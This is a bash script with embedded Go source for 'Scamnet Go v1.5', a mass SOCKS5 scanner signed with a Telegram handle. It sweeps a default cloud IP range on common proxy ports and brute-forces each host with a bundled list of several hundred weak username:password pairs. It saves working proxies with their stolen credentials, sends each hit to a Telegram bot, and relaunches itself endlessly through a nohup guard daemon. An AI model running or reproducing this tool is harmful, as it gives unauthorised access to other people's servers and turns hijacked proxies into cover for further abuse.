#!/bin/bash
# main.sh - Scamnet Go v1.5 OTC TG:soqunla （终极防截断版）
set -euo pipefail
IFS=$'\n\t'
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"
GO_BIN="$LOG_DIR/scamnet_go"
VALID_FILE="socks5_valid.txt"
WEAK_FILE="$LOG_DIR/weak.txt"
log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }

if ! command -v go >/dev/null 2>&1; then
    err "未找到 Go，请先安装: apt install golang-go -y"
    exit 1
fi

# 默认高命中段
DEFAULT_START="47.80.0.0"
DEFAULT_END="47.86.255.255"
read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
read_ip "起始 IP" "$DEFAULT_START" START_IP
read_ip "结束 IP" "$DEFAULT_END" END_IP

if ! [[ $START_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || ! [[ $END_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    err "IP 格式错误"; exit 1
fi
if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
    err "起始 IP 必须 ≤ 结束 IP"; exit 1
fi
succ "范围: $START_IP - $END_IP"

echo -e "${YELLOW}端口（默认: 1080,8080,8888,3128）:${NC}"
read -r PORT_INPUT; PORT_INPUT=${PORT_INPUT:-1080,8080,8888,3128}
PORTS=$(echo "$PORT_INPUT" | tr ',' ' ')
succ "端口: $PORT_INPUT"

echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
[[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }

log "正在创建弱口令字典 $WEAK_FILE ..."
cat > "$WEAK_FILE" << 'EOF'
admin:admin
::
0:0
00:00
000:000
0000:0000
00000:00000
000000:000000
1:1
11:11
111:111
1111:1111
11111:11111
111111:111111
2:2
22:22
222:222
2222:2222
22222:22222
222222:222222
3:3
33:33
333:333
3333:3333
33333:33333
333333:333333
4:4
44:44
444:444
4444:4444
44444:44444
444444:444444
5:5
55:55
555:555
5555:5555
55555:55555
555555:555555
6:6
66:66
666:666
6666:6666
66666:66666
666666:666666
7:7
77:77
777:777
7777:7777
77777:77777
777777:777777
8:8
88:88
888:888
8888:8888
88888:88888
888888:888888
9:9
99:99
999:999
9999:9999
99999:99999
999999:999999
1080:1080
123:123
123:321
123:456
123:abc
123:qwe
1234:1234
1234:4321
1234:5678
1234:abcd
1234:qwer
12345:12345
12345:54321
12345:67890
12345:678910
12345:abcde
12345:qwert
123456:123456
123456:654321
123456:abcdef
123456:qwerty
123456:qwert
12345678:12345678
12345678:87654321
123456789:123456789
123456789:987654321
123459:123459
12349:12349
1239:1239
321:321
520:520
520:1314
69:69
6969:6969
696969:696969
a:a
a:b
aa:aa
aaa:aaa
aaaa:aaaa
aaaaa:aaaaa
aaaaaa:aaaaaa
aaa:111
aaa:123
aaa:bbb
a123:a123
aa123:aa123
aaa123:aaa123
aa123456:aa123456
a123456:a123456
123aa:123aa
123aaa:123aaa
123abc:123abc
ab:ab
ab:cd
abc:123
abc:abc
abc:cba
abc:def
abcdefg:abcdefg
abc123:abc123
abcde:abcde
admin:
admin:123
admin:123456
admin123:admin
as:df
asd:asd
asd:fgh
awsl:awsl
b:b
bb:bb
bbb:bbb
bbbb:bbbb
bbbbb:bbbbb
bbbbbb:bbbbbb
c:c
cc:cc
ccc:ccc
cccc:cccc
ccccc:ccccc
cccccc:cccccc
cnmb:cnmb
d:d
dd:dd
ddd:ddd
dddd:dddd
ddddd:ddddd
dddddd:dddddd
demo:demo
e:e
ee:ee
eee:eee
eeee:eeee
eeeee:eeeee
eeeeee:eeeeee
f:f
ff:ff
fff:fff
ffff:ffff
fffff:fffff
ffffff:ffffff
fuckyou:fuckyou
g:g
gg:gg
ggg:ggg
gggg:gggg
ggggg:ggggg
gggggg:gggggg
guest:guest
h:h
hh:hh
hhh:hhh
hhhh:hhhh
hhhhh:hhhhh
hhhhhh:hhhhhh
hello:hello
i:i
ii:ii
iii:iii
iiii:iiii
iiiii:iiiii
iiiiii:iiiiii
j:j
jj:jj
jjj:jjj
jjjj:jjjj
jjjjj:jjjjj
jjjjjj:jjjjjj
k:k
kk:kk
kkk:kkk
kkkk:kkkk
kkkkk:kkkkk
kkkkkk:kkkkkk
l:l
ll:ll
lll:lll
llll:llll
lllll:lllll
llllll:llllll
love:love
m:m
mm:mm
mmm:mmm
mmmm:mmmm
mmmmm:mmmmm
mmmmmm:mmmmmm
n:n
nn:nn
nnn:nnn
nnnn:nnnn
nnnnn:nnnnn
nnnnnn:nnnnnn
nmsl:nmsl
o:o
oo:oo
ooo:ooo
oooo:oooo
ooooo:ooooo
oooooo:oooooo
p:p
pp:pp
ppp:ppp
pppp:pppp
ppppp:ppppp
pppppp:pppppp
password:password
proxy:proxy
q:q
qaq:qaq
qaq:qwq
qq:qq
qqq:qqq
qqqq:qqqq
qqqqq:qqqqq
qqqqqq:qqqqqq
qwe:123
qwe:asd
qwe:qwe
qwe123:qwe123
qweasd:qweasd
qwer:1234
qwer:qwer
qwert:12345
qwert:qwert
qwerty:123456
qwerty:qwerty
qwq:qaq
qwq:qwe
qwq:qwq
r:r
rr:rr
rrr:rrr
rrrr:rrrr
rrrrr:rrrrr
rrrrrr:rrrrrr
root:root
s:s
s5:s5
ss:ss
sss:sss
ssss:ssss
sssss:sssss
ssssss:ssssss
socks:socks
socks5:socks5
t:t
test:test
test123:test123
tt:tt
ttt:ttt
tttt:tttt
ttttt:ttttt
tttttt:tttttt
u:u
user:123
user:1234
user:12345
user:123456
user:pass
user:password
user:pwd
user:user
username:username
uu:uu
uuu:uuu
uuuu:uuuu
uuuuu:uuuuu
uuuuuu:uuuuuu
v:v
vv:vv
vvv:vvv
vvvv:vvvv
vvvvv:vvvvv
vvvvvv:vvvvvv
w:w
wsnd:wsnd
ww:ww
www:www
wwww:wwww
wwwww:wwwww
wwwwww:wwwwww
x:x
xx:xx
xxx:xxx
xxxx:xxxx
xxxxx:xxxxx
xxxxxx:xxxxxx
y:y
yy:yy
yyy:yyy
yyyy:yyyy
yyyyy:yyyyy
yyyyyy:yyyyyy
z:z
zz:zz
zzz:zzz
zzzz:zzzz
zzzzz:zzzzz
zzzzzz:zzzzzz
EOF

log "正在编译 Go 扫描器（v1.5 外部字典版 TG:soqunla）..."

# ============ Go 源码 ============
cat > scamnet.go << 'EOF'
package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"golang.org/x/sync/semaphore"
)

type Config struct {
	StartIP        string
	EndIP          string
	Ports          string
	TelegramToken  string
	TelegramChat   string
	BatchSize      int
	MaxConcurrent  int
	Timeout        int
}

var (
	cfg          Config
	validFile    = "socks5_valid.txt"
	weakFile     = "logs/weak.txt"
	seen         = sync.Map{}
	stats        = make(map[string]int)
	statsMu      sync.Mutex
	countryCache = sync.Map{}
	weakPairs    = [][2]string{{"admin", "admin"}}
)

type IPInfo struct {
	Origin string `json:"origin"`
}

func loadWeakPairs() {
	data, err := os.ReadFile(weakFile)
	if err != nil { return }
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") { continue }
		parts := strings.SplitN(line, ":", 2)
		user := parts[0]
		pass := ""
		if len(parts) > 1 { pass = parts[1] }
		weakPairs = append(weakPairs, [2]string{user, pass})
	}
}

func main() {
	flag.StringVar(&cfg.StartIP, "start", "", "Start IP")
	flag.StringVar(&cfg.EndIP, "end", "", "End IP")
	flag.StringVar(&cfg.Ports, "ports", "1080", "Ports")
	flag.StringVar(&cfg.TelegramToken, "tg-token", "", "Telegram Token")
	flag.StringVar(&cfg.TelegramChat, "tg-chat", "", "Telegram Chat ID")
	flag.IntVar(&cfg.BatchSize, "batch", 250, "Batch size")
	flag.IntVar(&cfg.MaxConcurrent, "conc", 150, "Max concurrent")
	flag.IntVar(&cfg.Timeout, "timeout", 6, "Timeout seconds")
	flag.Parse()

	if cfg.MaxConcurrent == 0 { cfg.MaxConcurrent = 150 }
	if cfg.BatchSize == 0 { cfg.BatchSize = 250 }
	if cfg.Timeout == 0 { cfg.Timeout = 6 }

	if cfg.StartIP == "" || cfg.EndIP == "" {
		fmt.Println("Usage: scamnet_go -start 1.1.1.1 -end 1.1.1.255 -ports 1080")
		os.Exit(1)
	}

	loadWeakPairs()
	start := ipToInt(cfg.StartIP)
	end := ipToInt(cfg.EndIP)
	ports := parsePorts(cfg.Ports)
	total := uint64(end-start+1) * uint64(len(ports))
	batchCount := (total + uint64(cfg.BatchSize) - 1) / uint64(cfg.BatchSize)

	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d | 弱口令: %d 条\n", total, cfg.BatchSize, batchCount, len(weakPairs))

	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	f.WriteString("# Scamnet Go v1.5 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
	f.Close()

	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
		batchEnd := batchStart + uint64(cfg.BatchSize)
		if batchEnd > total { batchEnd = total }
		fmt.Printf("[*] 批次 %d/%d → %d tasks\n", batchStart/uint64(cfg.BatchSize)+1, batchCount, batchEnd-batchStart)
		scanBatchByIndex(start, end, ports, batchStart, batchEnd)
	}

	dedupAndReport()
}

func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd uint64) {
	sem := semaphore.NewWeighted(int64(cfg.MaxConcurrent))
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	var wg sync.WaitGroup
	taskIdx := batchStart

	for ip := startIP; ip <= endIP && taskIdx < batchEnd; ip++ {
		s := intToIP(ip)
		for _, p := range ports {
			if taskIdx >= batchEnd { goto done }
			target := fmt.Sprintf("%s:%d", s, p)
			wg.Add(1)
			go func(t string) {
				defer wg.Done()
				select {
				case <-ctx.Done(): return
				case <-time.After(8 * time.Second): return
				default:
					if err := sem.Acquire(ctx, 1); err != nil { return }
					defer sem.Release(1)
					scanTarget(t)
				}
			}(target)
			taskIdx++
		}
	}
done:
	wg.Wait()
}

func scanTarget(target string) {
	if _, ok := seen.Load(target); ok { return }
	seen.Store(target, true)
	parts := strings.SplitN(target, ":", 2)
	ip := parts[0]
	port, _ := strconv.Atoi(parts[1])

	// 弱口令优先
	for _, p := range weakPairs {
		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
			saveAndNotify(ip, port, p[0], p[1], origin, lat)
			return
		}
	}

	// 无密码最后
	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
		saveAndNotify(ip, port, "", "", origin, lat)
	}
}

func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
	proxyURL := fmt.Sprintf("socks5://%s:%s@%s:%d", user, pass, ip, port)
	if user == "" && pass == "" {
		proxyURL = fmt.Sprintf("socks5://%s:%d", ip, port)
	}
	u, err := url.Parse(proxyURL)
	if err != nil { return false, 0, "" }

	client := &http.Client{
		Transport: &http.Transport{
			Proxy:               http.ProxyURL(u),
			DialContext:         (&net.Dialer{Timeout: time.Duration(cfg.Timeout) * time.Second}).DialContext,
			TLSHandshakeTimeout: time.Duration(cfg.Timeout) * time.Second,
			ResponseHeaderTimeout: time.Duration(cfg.Timeout) * time.Second,
		},
		Timeout: time.Duration(cfg.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	start := time.Now()
	resp, err := client.Get("https://httpbin.org/ip")
	lat := int(time.Since(start).Milliseconds())

	if err != nil { return false, lat, "" }
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil { return false, lat, "" }

	fmt.Fprintf(os.Stderr, "[DEBUG] %s:%d | Status: %d | Body: %s\n", ip, port, resp.StatusCode, string(body))

	var info IPInfo
	if err := json.Unmarshal(body, &info); err != nil { return false, lat, "" }
	if info.Origin == "" { return false, lat, "" }
	return true, lat, info.Origin
}

func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
	country := getCountry(origin)
	auth := ""
	if user != "" || pass != "" { auth = user + ":" + pass + "@" }
	result := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
	f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	fmt.Fprintln(f, result)
	f.Close()
	statsMu.Lock()
	stats[country]++
	statsMu.Unlock()
	fmt.Printf("[+] %s (%dms)\n", result, lat)
	if cfg.TelegramToken != "" {
		sendTelegram(fmt.Sprintf("New: <code>%s</code>\nDelay: %dms | %s", result, lat, country))
	}
}

func getCountry(ip string) string {
	if c, ok := countryCache.Load(ip); ok { return c.(string) }
	for _, u := range []string{
		"http://ip-api.com/json/" + ip + "?fields=countryCode",
		"https://ipinfo.io/" + ip + "/country",
	} {
		client := &http.Client{Timeout: 4 * time.Second}
		if resp, err := client.Get(u); err == nil && resp.StatusCode == 200 {
			body, _ := ioutil.ReadAll(resp.Body)
			code := strings.TrimSpace(string(body))
			if len(code) == 2 && regexp.MustCompile(`^[A-Z]{2}$`).MatchString(code) {
				countryCache.Store(ip, code)
				return code
			}
		}
	}
	countryCache.Store(ip, "XX")
	return "XX"
}

func sendTelegram(msg string) {
	if cfg.TelegramToken == "" || cfg.TelegramChat == "" { return }
	urlStr := "https://api.telegram.org/bot" + cfg.TelegramToken + "/sendMessage"
	data := url.Values{}
	data.Set("chat_id", cfg.TelegramChat)
	data.Set("text", msg)
	data.Set("parse_mode", "HTML")
	http.PostForm(urlStr, data)
}

func dedupAndReport() {
	file, _ := os.Open(validFile)
	scanner := bufio.NewScanner(file)
	lines := make(map[string]bool)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines[line] = true
		}
	}
	file.Close()

	sorted := make([]string, 0, len(lines))
	for l := range lines { sorted = append(sorted, l) }
	sort.Strings(sorted)

	out, _ := os.Create(validFile + ".tmp")
	out.WriteString("# Scamnet Go v1.5 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
	for _, l := range sorted { out.WriteString(l + "\n") }
	out.Close()
	os.Rename(validFile+".tmp", validFile)

	count := len(sorted)
	fmt.Printf("[+] 扫描完成 TG:soqunla → %s (%d 条)\n", validFile, count)
	if cfg.TelegramToken != "" {
		sendTelegram(fmt.Sprintf("Scan completed! Total <b>%d</b> valid proxies", count))
	}
}

func ipToInt(ip string) uint32 {
	parts := strings.Split(ip, ".")
	a, _ := strconv.Atoi(parts[0])
	b, _ := strconv.Atoi(parts[1])
	c, _ := strconv.Atoi(parts[2])
	d, _ := strconv.Atoi(parts[3])
	return uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(d)
}

func intToIP(n uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d", n>>24&255, n>>16&255, n>>8&255, n&255)
}

func parsePorts(s string) []int {
	var ports []int
	for _, p := range strings.Fields(s) {
		if strings.Contains(p, "-") {
			parts := strings.Split(p, "-")
			start, _ := strconv.Atoi(parts[0])
			end, _ := strconv.Atoi(parts[1])
			for i := start; i <= end; i++ { ports = append(ports, i) }
		} else {
			i, _ := strconv.Atoi(p)
			ports = append(ports, i)
		}
	}
	return ports
}
EOF
# ============ Go 源码结束 ============

go mod init scamnet 2>/dev/null || true
go get golang.org/x/sync/semaphore 2>/dev/null || true
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
succ "Go 扫描器编译完成 → $GO_BIN"

# ============ 守护脚本 ============
GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
cat > "$GUARD_SCRIPT" << EOF
#!/bin/bash
LOG="$LATEST_LOG"
MAX_LINES=500
GO_BIN="$GO_BIN"
START_IP="$START_IP"
END_IP="$END_IP"
PORTS="$PORTS"
TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
TELEGRAM_CHATID="$TELEGRAM_CHATID"

> "\$LOG"
echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.5 启动" | tee -a "\$LOG"
echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"

while :; do
    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "\$LOG"
    "\$GO_BIN" -start "\$START_IP" -end "\$END_IP" -ports "\$PORTS" \
        -tg-token "\$TELEGRAM_TOKEN" -tg-chat "\$TELEGRAM_CHATID" \
        -batch 250 -conc 150 -timeout 6 \
        2>&1 | grep -E '^\\\[\\+\\\]|\\\[GUARD\\\]|\\\[DEBUG\\\]' | tee -a "\$LOG"
    tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" 2>/dev/null && mv "\$LOG.tmp" "\$LOG"
    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "\$LOG"
    sleep 3
done
EOF
chmod +x "$GUARD_SCRIPT"

pkill -f "scamnet_guard.sh" 2>/dev/null || true
sleep 1
nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
succ "守护进程已启动！PID: $!"
log "日志: tail -f $LATEST_LOG"
log "结果: cat $VALID_FILE"
log "停止: pkill -f scamnet_guard.sh"
log "测试: timeout 20 $GO_BIN -start 47.80.2.13 -end 47.80.2.13 -ports 1080"
